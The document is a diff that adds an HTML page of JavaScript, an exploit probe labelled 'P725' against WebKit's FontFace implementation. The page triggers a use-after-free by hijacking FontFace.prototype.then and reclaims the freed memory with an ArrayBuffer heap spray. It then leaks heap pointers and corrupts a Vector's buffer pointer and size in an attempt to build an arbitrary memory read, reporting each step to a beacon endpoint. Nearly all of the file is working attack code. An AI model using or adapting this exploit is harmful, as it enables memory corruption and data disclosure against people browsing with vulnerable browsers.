@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P725 — FontFace Property Memory Disclosure & Oracle Scout</title>
+<script>
+'use strict';
+/* ============================================================
+ * P725 — FontFace Property Memory Disclosure & Oracle Scout
+ *
+ * Background & Ground Truth:
+ * - P722/P723 established 100% deterministic reclaim at baseK (57-68).
+ * - Vector fields q11 (m_buffer) and q12 (capacity << 32 | size) are
+ *   fully controlled with zero crashes.
+ *
+ * Hypotheses & Targets:
+ * 1. WebKit's CSSFontFace contains Vector<UnicodeRange> m_ranges and
+ *    Vector<Ref<CSSFontFaceSource>> m_sources.
+ * 2. If q11/q12 is m_ranges, each element is {uint32 from, uint32 to}.
+ *    Accessing FACE_B.unicodeRange in JS parses m_buffer elements directly
+ *    into a string ("u+from-to"). If so, pointing m_buffer to any pointer
+ *    yields an immediate, high-fidelity Arbitrary Memory Read Oracle!
+ * 3. If q11/q12 is featureSettings, variant, or sources, reading or
+ *    invoking methods will disclose or dereference our crafted memory.
+ *
+ * Probe Plan:
+ * 1. Baseline leak (P58, P68) with self-healing retry.
+ * 2. Proven UAF reclaim with winning pair (q12=P58, q6=P58).
+ * 3. Inspect all FontFace properties BEFORE vector poison.
+ * 4. Populate P58 with signature values:
+ *      slot 0: 0x0000004200000041n  (U+0041-0042)
+ *      slot 1: 0x0000123400001000n  (U+1000-1234)
+ *      slot 2: P68                   (Heap Pointer Leak Test!)
+ *    Set m_buffer = P58, m_capacity = 4, m_size = 3.
+ * 5. Re-read all FontFace properties and beacon results.
+ * 6. Test setter: FACE_B.unicodeRange = 'U+0055-0066' to monitor writes.
+ * 7. Call fonts.check() and face.load(), monitor secondary diffs.
+ * ============================================================ */
+
+function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }
+
+function b(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P725-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+
+function log(s){
+  var el = document.getElementById('out');
+  if(el) el.textContent += s + '\n';
+}
+
+var P58 = null, P68 = null;
+var FACE_B = null, BUF_B = null, VIEW_B = null;
+
+function snap(){
+  if(!VIEW_B) return [];
+  var arr = [];
+  for(var q=0; q<24; q++) arr.push(VIEW_B[q]);
+  return arr;
+}
+
+function diffSnap(pre){
+  if(!VIEW_B || !pre.length) return 'none';
+  var ch = [];
+  for(var q=0; q<24; q++){
+    if(VIEW_B[q] !== pre[q]){
+      ch.push('q' + q + '=0x' + h16(VIEW_B[q]));
+    }
+  }
+  return ch.length ? ch.join(',') : 'none';
+}
+
+function readAllProps(f){
+  if(!f) return 'null';
+  var names = ['unicodeRange','featureSettings','variationSettings','style','weight','stretch','display','status','family'];
+  var parts = [];
+  for(var i=0; i<names.length; i++){
+    var n = names[i];
+    try {
+      var val = f[n];
+      parts.push(n + '=' + String(val));
+    } catch(e){
+      parts.push(n + '=ERR:' + e.message);
+    }
+  }
+  return parts.join('|');
+}
+
+function run(){
+  b('BOOT','p725-oracle-scout');
+  log('=== P725 FontFace Property Memory Disclosure & Oracle Scout ===\n');
+
+  /* Step 1: Baseline Leak */
+  log('[Step 1] Baseline heap leak...');
+  doLeak(function(){
+    log('P58 = 0x' + h16(P58));
+    log('P68 = 0x' + h16(P68) + '\n');
+
+    /* Step 2: Proven UAF Reclaim */
+    log('[Step 2] Executing deterministic reclaim...');
+    doReclaim(function(){
+      /* Step 3: Property Read & Vector Oracle Test */
+      log('\n[Step 3] Testing property disclosure & vector oracle...');
+      testOracle();
+    });
+  });
+}
+
+/* ---- Step 1: Baseline Leak ---- */
+function doLeak(cb){
+  b('LEAK-GO','');
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+
+  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
+  document.fonts.add(face);
+  void face.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired) return undefined; fired=true;
+      if(st){st.remove(); st.textContent=''; st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk0');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl0, lk0','AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+
+    if(best<0 || bestNz<4){
+      b('LEAK-MISS','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    var v = new BigUint64Array(abs[best]);
+    extractPointers(v);
+
+    if(!P58){
+      b('LEAK-NOPTR','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
+    setTimeout(cb, 100);
+  }, 350);
+}
+
+function doLeakRetry(cb){
+  b('LEAK-RETRY','');
+  var st2 = document.createElement('style');
+  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
+  document.head.appendChild(st2);
+
+  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
+  document.fonts.add(face2);
+  void face2.loaded;
+
+  var abs2 = [], fired2 = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired2) return undefined; fired2=true;
+      if(st2){st2.remove(); st2.textContent=''; st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl1, lk1','CD');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs2.length;i++){
+      var u=new Uint8Array(abs2[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+    if(best<0 || bestNz<4){ b('LEAK-RETRY-MISS','nz='+bestNz); return; }
+    var v = new BigUint64Array(abs2[best]);
+    extractPointers(v);
+    if(!P58){ b('LEAK-RETRY-NOPTR','nz='+bestNz); return; }
+    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+function extractPointers(v){
+  var LOW = BigInt('0x1000000000');
+  var HIGH = BigInt('0x80000000000');
+  for(var q=0;q<24;q++){
+    var val = v[q];
+    if(val >= LOW && val < HIGH){
+      if(!P58) P58 = val;
+      else if(!P68 && val !== P58) P68 = val;
+    }
+  }
+  if(!P68) P68 = 0n;
+}
+
+/* ---- Step 2: Proven UAF Reclaim ---- */
+function doReclaim(cb){
+  b('RECLAIM-GO', 'fill_q12_q6=0x' + h16(P58));
+
+  var stTr = document.createElement('style');
+  stTr.textContent = '@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
+  document.head.appendChild(stTr);
+
+  FACE_B = new FontFace('trFace', 'local(Helvetica)', {unicodeRange:'U+0048'});
+  document.fonts.add(FACE_B);
+  void FACE_B.loaded;
+
+  var absW = [], firedW = false;
+
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if(firedW) return undefined; firedW = true;
+      if(stTr){ stTr.remove(); stTr.textContent = ''; }
+      try{ document.fonts.delete(this); }catch(e){}
+      document.body.offsetHeight;
+
+      for(var k=0; k<80; k++){
+        var ab = new ArrayBuffer(192);
+        var view = new BigUint64Array(ab);
+        view[12] = P58;
+        view[6]  = P58;
+        absW.push(ab);
+      }
+      try{ document.fonts.check('1em trFam'); }catch(e){}
+      return undefined;
+    }, set: function(){}
+  });
+
+  document.fonts.load('1em trFace, trFam', 'GH');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best = -1, bestNz = 0;
+    for(var i=0; i<absW.length; i++){
+      var u = new Uint8Array(absW[i]), nz = 0;
+      for(var j=0; j<u.length; j++) if(u[j] !== 0) nz++;
+      if(nz > bestNz){ bestNz = nz; best = i; }
+    }
+
+    if(best < 0 || bestNz < 4){
+      b('RECLAIM-MISS', 'nz=' + bestNz);
+      log('Reclaim missed!');
+      return;
+    }
+
+    BUF_B = absW[best];
+    VIEW_B = new BigUint64Array(BUF_B);
+
+    var dumpStr = 'baseK=' + best + '|nz=' + bestNz +
+                  '|q0=0x' + h16(VIEW_B[0]) + '|q11=0x' + h16(VIEW_B[11]) +
+                  '|q12=0x' + h16(VIEW_B[12]) + '|q13=0x' + h16(VIEW_B[13]);
+    b('RECLAIM-OK', dumpStr);
+    log('Deterministic Reclaim OK: ' + dumpStr);
+
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+/* ---- Step 3: Oracle & Property Reflection ---- */
+function testOracle(){
+  if(!VIEW_B || !FACE_B) return;
+
+  /* 3A: Properties BEFORE modification */
+  var preProps = readAllProps(FACE_B);
+  b('PROPS-PRE', preProps);
+  log('Pre-Poison Properties: ' + preProps);
+
+  /* 3B: Set test pattern into P58
+   * If Vector is UnicodeRange:
+   *   slot 0: low=0x0041 ('A'), high=0x0042 ('B') -> 'u+41-42'
+   *   slot 1: low=0x1000,       high=0x1234        -> 'u+1000-1234'
+   *   slot 2: P68 (Heap pointer test)
+   */
+  VIEW_B[0] = 0x0000004200000041n;
+  VIEW_B[1] = 0x0000123400001000n;
+  VIEW_B[2] = P68;
+  VIEW_B[3] = 0x0000000000000000n;
+
+  /* Point m_buffer to P58, set capacity=4, size=3 */
+  VIEW_B[11] = P58;
+  VIEW_B[12] = 0x0000000400000003n;
+
+  b('VECTOR-POISON-OK', 'buf=P58|cap=4|size=3|p68=0x' + h16(P68));
+  log('Vector Poisoned with test signatures.');
+
+  /* 3C: Read properties AFTER vector modification */
+  var postProps = readAllProps(FACE_B);
+  b('PROPS-POST', postProps);
+  log('Post-Poison Properties: ' + postProps);
+
+  /* 3D: Test Setter Reflection (Does setting unicodeRange write to m_buffer?) */
+  var preSnap = snap();
+  var setterRes = 'ok';
+  try {
+    FACE_B.unicodeRange = 'U+0055-0066';
+  } catch(e){
+    setterRes = 'ERR:' + e.message;
+  }
+  var postSetterProps = readAllProps(FACE_B);
+  var setterWrites = diffSnap(preSnap);
+  b('SETTER-REPORT', 'res=' + setterRes + '|writes=' + setterWrites + '|props=' + postSetterProps);
+  log('Setter test: ' + setterRes + ' | writes: ' + setterWrites);
+
+  /* 3E: Test Lifecycle methods */
+  preSnap = snap();
+  var chk = false;
+  try { chk = document.fonts.check('1em trFace'); } catch(e){}
+  var checkWrites = diffSnap(preSnap);
+  b('CHECK-REPORT', 'chk=' + chk + '|writes=' + checkWrites);
+
+  /* 3F: Final State */
+  var finalDump = [];
+  for(var q=0; q<16; q++) finalDump.push('q' + q + '=0x' + h16(VIEW_B[q]));
+  b('FINAL-STATE', finalDump.join(';').slice(0, 700));
+
+  b('DONE', 'p725-complete');
+  log('\n=== P725 Complete! ===');
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P725 — Initializing FontFace Property Memory Disclosure Scout...</pre></body></html>
